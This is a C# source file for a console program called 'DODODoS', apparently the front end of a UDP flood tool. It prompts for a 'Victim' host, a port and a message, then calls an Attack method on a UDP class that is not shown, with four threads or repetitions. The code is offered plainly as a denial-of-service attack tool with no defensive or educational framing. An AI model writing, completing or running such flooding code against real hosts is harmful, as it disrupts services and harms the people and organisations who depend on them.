using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DODODoS
{
    class Program
    {
        static void Main(string[] args)
        {
            bool exit=true;
            Dictionary<String, Action> cmd = new Dictionary<string, Action>();
            cmd.Add("udp",new Action(UDP));

            while (exit)
            {
                Console.Write("> ");
                string command = Console.ReadLine().ToLower();
                cmd[command]();
            }
        }

        static void UDP()
        {
            DODODoS.UDP victim = new DODODoS.UDP();
            Console.Write("Victim: ");
            string host = Console.ReadLine();
            Console.Write("Port: ");
            int port = Convert.ToInt32(Console.ReadLine());
            Console.Write("Message: ");
            byte[] message = Encoding.ASCII.GetBytes(Console.ReadLine());

            victim.Connect(host, port);
            victim.Attack(message, 4);
        }
    }
}
